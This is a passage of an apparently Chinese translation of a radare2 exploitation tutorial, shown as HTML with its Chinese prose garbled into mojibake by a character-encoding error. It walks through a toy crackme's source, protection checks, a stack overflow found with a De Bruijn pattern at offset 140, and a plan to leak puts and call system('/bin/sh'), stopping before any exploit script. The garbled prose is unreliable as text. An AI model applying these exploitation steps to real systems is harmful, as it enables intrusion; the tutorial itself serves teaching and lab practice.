class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *input; </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\n  .:: Megabeets ::.\n"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Show me what you got:"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%ms"</span>, &amp;input);</span><br><span class="line">    <span class="keyword">if</span> (beet(input))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Success!\n\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Nop, Wrong argument.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºçš„åŠŸèƒ½ååˆ†ç®€å•ï¼Œå¹¶ä¸”åœ¨å‰ä¸€ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬å·²ç»å¯¹å®ƒå¾ˆç†Ÿæ‚‰äº†â€”â€”è¦æ±‚è¾“å…¥å­—ç¬¦ä¸²ï¼Œä¸ç»è¿‡<code>rot13</code>åŠ å¯†çš„å­—ç¬¦ä¸²<code>Megabeets</code>æ¯”è¾ƒã€‚æ•…è¾“å…¥åº”è¯¥ä¸º<code>Zrtnorrgf</code>ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ./megabeets_0x2 </span><br><span class="line"></span><br><span class="line">  .:: Megabeets ::.</span><br><span class="line"></span><br><span class="line">Show me what you got:</span><br><span class="line">blablablabla</span><br><span class="line">Nop, Wrong argument.</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span> ./megabeets_0x2 </span><br><span class="line"></span><br><span class="line">  .:: Megabeets ::.</span><br><span class="line"></span><br><span class="line">Show me what you got:</span><br><span class="line">Zrtnorrgf</span><br><span class="line">Success!</span><br></pre></td></tr></table></figure><p>è¿™äº›éƒ½å¾ˆç®€å•ï¼Œä½†æ˜¯æˆ‘ä»¬ä»Šå¤©çš„é‡ç‚¹å¹¶ä¸æ˜¯ç ´è§£ä¸€ä¸ªç®€å•çš„crackmeï¼Œè€Œæ˜¯å¯¹å…¶è¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚é‚£æˆ‘ä»¬å¼€å§‹å§ï¼</p><h1 id="ç†è§£æ¼æ´"><a href="#ç†è§£æ¼æ´" class="headerlink" title="ç†è§£æ¼æ´"></a>ç†è§£æ¼æ´</h1><p>å¯¹äºæ¯ä¸€ä¸ªPWNé¢˜ç»™å‡ºçš„ç¨‹åºæ¥è¯´ï¼Œæ£€æŸ¥ç¨‹åºå¼€äº†ä»€ä¹ˆä¿æŠ¤æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­æåˆ°çš„<code>rabin2</code>ï¼Œæˆ–è€…ç›´æ¥åœ¨<code>radare2</code>çš„shellé‡Œæ‰§è¡Œ<code>i</code>å‘½ä»¤ã€‚å› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰ç”¨<code>radare2</code>æ‰“å¼€æ–‡ä»¶ï¼Œå°±å…ˆç”¨<code>rabin2</code>æ¥çœ‹çœ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> rabin2 -I megabeets_0x2</span><br><span class="line"> </span><br><span class="line">arch     x86</span><br><span class="line">binsz    6072</span><br><span class="line">bintype  elf</span><br><span class="line">bits     32</span><br><span class="line">canary   false</span><br><span class="line">class    ELF32</span><br><span class="line">crypto   false</span><br><span class="line">endian   little</span><br><span class="line">havecode true</span><br><span class="line">intrp    /lib/ld-linux.so.2</span><br><span class="line">lang     c</span><br><span class="line">linenum  true</span><br><span class="line">lsyms    true</span><br><span class="line">machine  Intel 80386</span><br><span class="line">maxopsz  16</span><br><span class="line">minopsz  1</span><br><span class="line">nx       true</span><br><span class="line">os       linux</span><br><span class="line">pcalign  0</span><br><span class="line">pic      false</span><br><span class="line">relocs   true</span><br><span class="line">relro    partial</span><br><span class="line">rpath    NONE</span><br><span class="line">static   false</span><br><span class="line">stripped false</span><br><span class="line">subsys   linux</span><br><span class="line">va       true</span><br></pre></td></tr></table></figure><p>åœ¨æ ‡è®°çš„å‡ è¡Œä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¨‹åºå¼€äº†<code>NX</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æ ˆæ˜¯ä¸å¯æ‰§è¡Œçš„ã€‚è¿˜æœ‰ï¼Œè¯¥ç¨‹åºæ²¡æœ‰å¼€å¯<a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries" target="_blank" rel="noopener"><code>Canary</code></a>ã€<a href="https://en.wikipedia.org/wiki/Position-independent_code" target="_blank" rel="noopener"><code>PIC</code></a>æˆ–æ˜¯<a href="https://tk-blog.blogspot.co.il/2009/02/relro-not-so-well-known-memory.html" target="_blank" rel="noopener"><code>RELRO</code></a>ã€‚</p><p>ç°åœ¨æˆ‘ä»¬è¿…é€Ÿåœ°è¿‡ä¸€éç¨‹åºçš„æ‰§è¡Œæµï¼Œè¿™æ¬¡æˆ‘ä»¬çœ‹ä¸€çœ‹å®ƒçš„åæ±‡ç¼–ä»£ç ï¼ˆå¹¶ä¸æ˜¯æ¯æ¬¡æ¼æ´æŒ–æ˜éƒ½èƒ½æœ‰æºç ï¼‰ã€‚ä½¿ç”¨<code>radare2</code>çš„è°ƒè¯•æ¨¡å¼æ‰“å¼€ç¨‹åºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> r2 -d megabeets_0x2</span><br><span class="line">Process with PID 20859 startedâ€¦</span><br><span class="line">= attach 20859 20859</span><br><span class="line">bin.baddr 0x08048000</span><br><span class="line">Using 0x8048000</span><br><span class="line">Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2</span><br><span class="line">asm.bits 32â€“ Your endian swaps</span><br><span class="line"><span class="meta">[0xf7782b30]&gt;</span> aas</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>-d</code>  â€“ ç”¨è°ƒè¯•æ¨¡å¼æ‰“å¼€</li><li><code>aas</code> â€“ åˆ†æå‡½æ•°ã€ç¬¦å·ä»¥åŠå…¶ä»–</li><li>æ³¨æ„ï¼šæ­£å¦‚æˆ‘åœ¨å‰ä¸€ç¯‡æ–‡ç« æ‰€æåˆ°çš„ï¼Œå¼€å§‹æ—¶ä½¿ç”¨<code>aaa</code>åˆ†ææ˜¯æœ€æ¨èçš„æ–¹å¼ï¼Œå› ä¸ºåˆ†ææœ¬æ¥å°±æ˜¯ä¸€ä¸ªå¾ˆå¤æ‚çš„è¿‡ç¨‹ã€‚æˆ‘åœ¨<a href="https://reverseengineering.stackexchange.com/a/16115/18698" target="_blank" rel="noopener">è¿™ç¯‡å›ç­”</a>é‡Œå†™äº†æ›´å¤šâ€”â€”è¯»ä¸€ä¸‹ä¹Ÿè®¸ä¼šè®©ä½ çš„ç†è§£æ›´æ·±ã€‚</li></ul></blockquote><p>ç°åœ¨æˆ‘ä»¬ç»§ç»­æ‰§è¡Œç¨‹åºï¼Œç›´åˆ°<code>main</code>å‡½æ•°ã€‚åªè¦è¾“å…¥å‘½ä»¤<code>dcu main</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0xf7797b30]&gt;</span> dcu?</span><br><span class="line">|Usage: dcu Continue until address</span><br><span class="line">| dcu address      Continue until address</span><br><span class="line">| dcu [..tail]     Continue until the range</span><br><span class="line">| dcu [from] [to]  Continue until the range</span><br><span class="line"><span class="meta">[0xf7797b30]&gt;</span> dcu main</span><br><span class="line">Continue until 0x08048658 using 1 bpsize</span><br><span class="line">hit breakpoint at: 8048658</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>dcu</code>ä»£è¡¨<code>debug continue until</code></li></ul></blockquote><p>ç°åœ¨è®©æˆ‘ä»¬è¾“å…¥<code>VV</code>è¿›å…¥å›¾å½¢æ¨¡å¼ã€‚åœ¨ç¬¬ä¸€éƒ¨åˆ†è§£é‡Šè¿‡ï¼Œä½ å¯ä»¥é€šè¿‡<code>p</code>å’Œ<code>P</code>åˆ‡æ¢è§†è§’ï¼Œé€šè¿‡<code>k</code>/<code>j</code>/<code>h</code>/<code>l</code>åˆ†åˆ«å‘ä¸Š/ä¸‹/å·¦/å³ç§»åŠ¨ï¼Œé€šè¿‡<code>g</code>å’Œè°ƒç”¨æ—çš„å­—æ¯è·³è½¬å‡½æ•°ï¼ˆä¾‹å¦‚<code>gd</code>ï¼‰ã€‚</p><p>ç”¨<code>?</code>æ¥åˆ—å‡ºæ‰€æœ‰åœ¨å›¾å½¢æ¨¡å¼ä¸‹çš„å‘½ä»¤ï¼ŒåŒæ—¶åˆ«å¿˜è®°<code>R</code>å‘½ä»¤ğŸ˜‰</p><p><img src="https://www.megabeets.net/uploads/mainsym.png" alt></p><p><code>main()</code>å‡½æ•°æ˜¯ç¨‹åºè¦æ±‚æˆ‘ä»¬è¾“å…¥çš„åœ°æ–¹ï¼Œå¹¶ä¸”å®ƒå°†è¾“å…¥ä¼ ç»™<code>sym.beet</code>ã€‚é€šè¿‡<code>gc</code>æˆ‘ä»¬è·³è½¬åˆ°å¤„ç†æˆ‘ä»¬è¾“å…¥çš„<code>beet()</code>å‡½æ•°ï¼š</p><p><img src="https://www.megabeets.net/uploads/beetsym.png" alt></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç”¨æˆ·çš„è¾“å…¥<code>[arg_8h]</code>è¢«å¤åˆ¶ç»™ä¸€ä¸ªç¼“å†²åŒºï¼ˆ<code>[local_88h]</code>ï¼‰ï¼Œç„¶åå°±æ˜¯æˆ‘ä»¬åœ¨å‰ä¸€ç¯‡æ–‡ç« ä¸­æ‰€çœ‹åˆ°è¿‡çš„ï¼Œå­—ç¬¦ä¸²<code>Megabeets</code>ç”¨<code>rot13</code>åŠ å¯†äº†ï¼Œæ‰€å¾—ç»“æœä¸æˆ‘ä»¬çš„è¾“å…¥åšæ¯”è¾ƒã€‚æˆ‘ä»¬ä¹‹å‰äº†è§£è¿‡ï¼Œæˆ‘è¿™é‡Œå°±ä¸åšæ·±ç©¶ã€‚</p><p>ä½ æœ‰çœ‹åˆ°ä»€ä¹ˆå¯ä»¥çš„åœ°æ–¹å—ï¼Ÿæˆ‘ä»¬çš„è¾“å…¥æ²¡æœ‰å¯¹é•¿åº¦åšæ£€æŸ¥ï¼Œç„¶åç›´æ¥å¤åˆ¶åˆ°äº†ç¼“å†²åŒºä¸­ã€‚è¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬è¾“å…¥ä¸€ä¸²è¶…è¿‡ç¼“å†²åŒºå¤§å°çš„å­—ç¬¦ä¸²ï¼Œå°±èƒ½å¯¼è‡´æ ˆä¸Šçš„ç¼“å†²åŒºæº¢å‡ºã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†æ¼æ´ã€‚</p><h1 id="è§„åˆ’æ¼æ´åˆ©ç”¨è„šæœ¬"><a href="#è§„åˆ’æ¼æ´åˆ©ç”¨è„šæœ¬" class="headerlink" title="è§„åˆ’æ¼æ´åˆ©ç”¨è„šæœ¬"></a>è§„åˆ’æ¼æ´åˆ©ç”¨è„šæœ¬</h1><p>æ—¢ç„¶æˆ‘ä»¬å·²ç»æ‰¾åˆ°äº†æœ‰æ¼æ´çš„å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªpayloadæ¥åˆ©ç”¨å®ƒã€‚æˆ‘ä»¬çš„ç›®æ ‡å¾ˆæ˜äº†ï¼Œå°±æ˜¯åœ¨ç³»ç»Ÿä¸ŠæˆåŠŸå¼€ä¸€ä¸ªshellã€‚é¦–å…ˆï¼Œæˆ‘ä»¬è¦ç¡®è®¤ç¡®å®æœ‰ä¸€ä¸ªæœ‰æ¼æ´çš„å‡½æ•°ï¼Œç„¶åæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæˆ‘ä»¬çš„payloadå¯ä»¥è¦†ç›–æ ˆçš„åç§»ã€‚</p><p><img src="https://www.megabeets.net/uploads/tumblr_m5vxpy8Cs41qfoh4t.gif" alt></p><p>æˆ‘ä»¬å°†ä¼šä½¿ç”¨ä¸€ä¸ª<code>radare2</code>æ¡†æ¶ä¸­çš„å·¥å…·ï¼Œå«åš<code>ragg2</code>ã€‚å®ƒèƒ½å¤Ÿä¸ºæˆ‘ä»¬ç”Ÿæˆä¸€æ®µå¾ªç¯çš„<a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence" target="_blank" rel="noopener">å¾·å¸ƒé²å› åºåˆ—</a>ï¼Œç”¨æ¥æ£€æµ‹è¦†ç›–ç¼“å†²åŒºçš„ç¡®åˆ‡çš„åç§»å¤§å°ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ragg2 -</span><br><span class="line">&lt;truncated&gt;</span><br><span class="line"> -P [size]       prepend debruijn pattern</span><br><span class="line">&lt;truncated&gt;</span><br><span class="line"> -r              show raw bytes instead of hexpairs</span><br><span class="line">&lt;truncated&gt;</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span> ragg2 -P 100 -r</span><br><span class="line">AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çŸ¥é“æˆ‘ä»¬çš„ç¨‹åºé€šè¿‡è¾“å…¥æµè¯»å–æˆ‘ä»¬çš„è¾“å…¥ï¼Œè€Œä¸æ˜¯ä»shellä¸­è¯»å–æˆ‘ä»¬çš„è¾“å…¥ã€‚æ•…æˆ‘ä»¬å°†ä¼šä½¿ç”¨åˆä¸€ä¸ªæ¥è‡ª<code>radare2</code>å·¥å…·ç®±ä¸­çš„å·¥å…·ï¼Œ<code>rarun2</code>ã€‚</p><blockquote><ul><li><p><code>rarun2</code>å¯ä»¥åœ¨ä¸åŒç¯å¢ƒã€å‚æ•°ã€æ‰§è¡Œæƒé™ã€æ–‡ä»¶å¤¹ä¸‹è¿è¡Œç¨‹åºï¼Œå¹¶ä¸”è¦†ç›–é»˜è®¤çš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆä¾‹å¦‚<code>stdin</code>ï¼‰</p></li><li><p>å¦‚æœä½ éœ€è¦åœ¨è·‘ä¸€ä¸ªç¨‹åºæ—¶ä½¿ç”¨å¾ˆé•¿çš„å‚æ•°ï¼Œå®ƒä¼šèµ·å¾ˆå¤§çš„ä½œç”¨ã€‚è€Œä¸”æ¼æ´åˆ©ç”¨é€šå¸¸éƒ½ä¼šå‘è¾“å…¥æµä¼ ä¸€å¤§å †æ•°æ®ã€‚</p></li></ul></blockquote><p>æˆ‘ä»¬éœ€è¦åšä»¥ä¸‹çš„ä¸‰ä¸ªæ­¥éª¤ï¼š</p><ul><li>ä½¿ç”¨<code>ragg2</code>å°†å¾·å¸ƒé²å› åºåˆ—å†™å…¥ä¸€ä¸ªæ–‡ä»¶</li><li>æ–°å»ºä¸€ä¸ª<code>rarun2</code>é…ç½®æ–‡ä»¶ï¼Œå¹¶ä¸”æŠŠå‰ä¸€ä¸ªæ–‡ä»¶ä½œä¸º<code>stdin</code></li><li>è®©<code>radare2</code>æ¥æ‰¾åˆ°åç§»</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ragg2 -P 200 -r &gt; pattern.txt</span><br><span class="line"><span class="meta">$</span> cat pattern.txt</span><br><span class="line">AAABAACAADAAEAAFAAGAAHAAIâ€¦ &lt;truncated&gt; â€¦7AA8AA9AA0ABBABCABDABEABFA</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span> vim profile.rr2</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span> cat profile.rr2</span><br><span class="line"><span class="meta">#</span>!/usr/bin/rarun2</span><br><span class="line">stdin=./pattern.txt</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span> r2 -r profile.rr2 -d megabeets_0x2</span><br><span class="line">Process with PID 21663 startedâ€¦</span><br><span class="line">= attach 21663 21663</span><br><span class="line">bin.baddr 0x08048000</span><br><span class="line">Using 0x8048000</span><br><span class="line">Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2</span><br><span class="line">asm.bits 32</span><br><span class="line"> </span><br><span class="line">â€” Use rarun2 to launch your programs with a predefined environment.</span><br><span class="line"><span class="meta">[0xf77c2b30]&gt;</span> dc</span><br><span class="line">Selecting and continuing: 21663</span><br><span class="line"> </span><br><span class="line">.:: Megabeets ::.</span><br><span class="line"> </span><br><span class="line">Show me what you got?</span><br><span class="line">child stopped with signal 11</span><br><span class="line"> </span><br><span class="line"><span class="meta">[0x41417641]&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿è¡Œç¨‹åºï¼Œå¹¶å°†<em>pattern.txt</em>çš„å†…å®¹ç”¨<code>rarun2</code>ä¼ ç»™<code>stdin</code>ï¼Œ<em>SIGSEV 11</em>ã€‚</p><blockquote><ul><li><p>ä¸€ä¸ªä¿¡å·æ˜¯ä¸€ç§å‘é€ç»™è¿›ç¨‹æˆ–æ˜¯ä¸€ä¸ªå…·ä½“çº¿ç¨‹çš„å¼‚æ­¥é€šçŸ¥ï¼Œè¿™æ ·ä¸ä¹‹ç›¸åŒçš„è¿›ç¨‹å°±ä¼šåœ¨æŸä¸ªäº‹ä»¶å‘ç”Ÿæ—¶å¾—åˆ°æé†’ã€‚</p></li><li><p>SIGSEGVï¼ˆ11ï¼‰ä¿¡å·åœ¨è®¿é—®äº†æŸä¸ªæ— æ•ˆçš„è™šæ‹Ÿå†…å­˜æˆ–æ®µé”™è¯¯åä¼šè§¦å‘ã€‚</p></li></ul></blockquote><p>ä½ å‘ç°äº†å—ï¼Ÿæˆ‘ä»¬å®æ—¶çš„æŒ‡é’ˆç°åœ¨æŒ‡å‘äº†<code>0x41417641</code>ã€‚è¿™æ˜¯ä¸€ä¸ªæ— æ•ˆçš„åœ°å€ï¼Œå®ƒè¡¨ç¤ºäº†å­—ç¬¦ä¸²<code>AvAA</code>ï¼ˆå°ç«¯åºåŠasciiç è½¬æ¢ï¼‰ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é€çš„å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚<code>radare2</code>å…è®¸æˆ‘ä»¬æ‰¾åˆ°ç»™å‡ºçš„å€¼åœ¨å¾·å¸ƒé²å› åºåˆ—ä¸­çš„åç§»ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x41417641]&gt;</span> wop?</span><br><span class="line">|Usage: wop[DO] len @ addr | value</span><br><span class="line">| wopD len [@ addr]  Write a De Bruijn Pattern of length â€˜lenâ€™ at address â€˜addrâ€™</span><br><span class="line">| wopO value         Finds the given value into a De Bruijn Pattern at current offset</span><br><span class="line"><span class="meta">[0x41417641]&gt;</span> wopO `dr eip`</span><br><span class="line">140</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶æˆ‘ä»¬å·²ç»çŸ¥é“éœ€è¦è¦†ç›–è¿”å›åœ°å€çš„åç§»ä¸º140ï¼Œæˆ‘ä»¬å¯ä»¥å¼€å§‹ç¼–å†™è„šæœ¬äº†ã€‚</p><h1 id="ç¼–å†™æ¼æ´åˆ©ç”¨è„šæœ¬"><a href="#ç¼–å†™æ¼æ´åˆ©ç”¨è„šæœ¬" class="headerlink" title="ç¼–å†™æ¼æ´åˆ©ç”¨è„šæœ¬"></a>ç¼–å†™æ¼æ´åˆ©ç”¨è„šæœ¬</h1><p>æˆ‘ä¹‹å‰ä¹Ÿæåˆ°è¿‡å¾ˆå¤šæ¬¡ï¼Œè¿™ç¯‡æ–‡ç« ä¸æ˜¯æ•™ä¸€äº›æ¼æ´åˆ©ç”¨çš„åŸºç¡€çŸ¥è¯†çš„ï¼Œå®ƒçš„ç›®çš„æ˜¯å±•ç¤º<code>radare2</code>åœ¨æ¼æ´åˆ©ç”¨ä¸­æ˜¯å¦‚ä½•ä½¿ç”¨çš„ã€‚å› æ­¤ï¼Œæˆ‘ä¸ä¼šè¿‡å¤šåœ°è§£é‡Šè„šæœ¬çš„æ¯ä¸ªéƒ¨åˆ†ã€‚</p><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯åœ¨ç³»ç»Ÿä¸­äº§ç”Ÿä¸€ä¸ªshellã€‚è¿™æœ‰å¾ˆå¤šç§æ–¹æ³•ï¼Œå°¤å…¶æ˜¯è¿™æ ·ä¸€ä¸ªç¨‹åºã€‚ä¸ºäº†çŸ¥é“æˆ‘ä»¬èƒ½åšä»€ä¹ˆï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“æˆ‘ä»¬ä¸èƒ½åšä»€ä¹ˆã€‚æˆ‘ä»¬çš„ç¨‹åºåœ¨å¼€äº†<code>ASLR</code>åœ°ç¯å¢ƒä¸‹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½çŒœæµ‹åˆ°<a href="https://en.wikipedia.org/wiki/C_standard_library" target="_blank" rel="noopener"><em>libc</em></a>åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚é‚£å°±å¯ä»¥å’Œ<a href="https://en.wikipedia.org/wiki/Return-to-libc_attack" target="_blank" rel="noopener"><em>ret2libc</em></a>è¯´å†è§äº†ã€‚å¦å¤–ï¼Œç¨‹åºå¼€äº†<code>NX</code>ï¼Œè¿™æ„å‘³æ ˆæ˜¯ä¸å¯æ‰§è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥åœ¨æ ˆä¸Šæ”¾ä¸€ä¸ª<a href="https://en.wikipedia.org/wiki/Shellcode" target="_blank" rel="noopener"><em>shellcode</em></a>ç„¶åè·³è¿‡å»ã€‚</p><p>è™½ç„¶è¿™äº›ä¿æŠ¤è®©æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨ä¸€äº›æ¼æ´åˆ©ç”¨æŠ€æœ¯ï¼Œç„¶è€Œè¿™ä¸èƒ½é˜»æ­¢æˆ‘ä»¬è½»æ¾åœ°ç»•è¿‡å®ƒä»¬ã€‚ç¼–å†™æˆ‘ä»¬çš„è„šæœ¬æ—¶ï¼Œéœ€è¦ç»†å¿ƒåœ°è§‚å¯Ÿæä¾›ç»™æˆ‘ä»¬çš„è¿è¡Œåº“ä»¥åŠå‡½æ•°ã€‚</p><p>è®©æˆ‘ä»¬å†æ¬¡é€šè¿‡è°ƒè¯•æ¨¡å¼æ‰“å¼€ç¨‹åºï¼Œç„¶åçœ‹ä¸€çœ‹å®ƒä½¿ç”¨çš„è¿è¡Œåº“å’Œå‡½æ•°ã€‚å…ˆçœ‹åº“ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">$</span> r2 -d megabeets_0x2</span><br><span class="line">Process with PID 23072 startedâ€¦</span><br><span class="line">= attach 23072 23072</span><br><span class="line">bin.baddr 0x08048000</span><br><span class="line">Using 0x8048000</span><br><span class="line">Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2</span><br><span class="line">asm.bits 32</span><br><span class="line">â€” You haxor! Me jane?</span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span> il</span><br><span class="line">[Linked libraries]</span><br><span class="line">libc.so.61 library</span><br></pre></td></tr></table></figure><p><code>il</code>è¡¨ç¤º<code>Information libraries</code>ï¼Œå³å‘Šè¯‰æˆ‘ä»¬ç¨‹åºæ‰€ä½¿ç”¨çš„è¿è¡Œåº“ã€‚å¯¹äºè¯¥ç¨‹åºæ¥è¯´ï¼Œåªæœ‰æˆ‘ä»¬æœ€çˆ±çš„<em>libc</em>ã€‚</p><p>ç°åœ¨é€šè¿‡æ‰§è¡Œ<code>ii</code>å‘½ä»¤â€”â€”<code>Information Imports</code>ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹å¯¼å…¥çš„å‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥åŠ ä¸Š<code>q</code>æ¥å‡å°‘å†—é•¿çš„è¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0xf7763b30]&gt;</span> ii</span><br><span class="line">[Imports]</span><br><span class="line">ordinal=001 plt=0x08048370 bind=GLOBAL type=FUNC name=strcmp</span><br><span class="line">ordinal=002 plt=0x08048380 bind=GLOBAL type=FUNC name=strcpy</span><br><span class="line">ordinal=003 plt=0x08048390 bind=GLOBAL type=FUNC name=puts</span><br><span class="line">ordinal=004 plt=0x00000000 bind=WEAK type=NOTYPE name=__gmon_start__</span><br><span class="line">ordinal=005 plt=0x080483a0 bind=GLOBAL type=FUNC name=__libc_start_main</span><br><span class="line">ordinal=006 plt=0x080483b0 bind=GLOBAL type=FUNC name=__isoc99_scanf6 imports</span><br><span class="line"></span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span> iiq</span><br><span class="line">strcmp</span><br><span class="line">strcpy</span><br><span class="line">puts</span><br><span class="line">__gmon_start__</span><br><span class="line">__libc_start_main</span><br><span class="line">__isoc99_scanf</span><br></pre></td></tr></table></figure><h2 id="è®¡åˆ’"><a href="#è®¡åˆ’" class="headerlink" title="è®¡åˆ’"></a>è®¡åˆ’</h2><ul><li>æ³„æ¼<code>puts</code>çš„çœŸå®åœ°å€</li><li>è®¡ç®—<em>libc</em>çš„åŸºå€</li><li>è®¡ç®—<code>system</code>çš„åœ°å€</li><li>åœ¨<em>libc</em>ä¸­æ‰¾åˆ°åŒ…å«å­—ç¬¦ä¸²<code>/bin/sh</code>çš„åœ°å€</li><li>è°ƒç”¨<code>system(&quot;/bin/sh&quot;)</code>æ‰“å¼€ä¸€ä¸ªshell</li></ul><h2 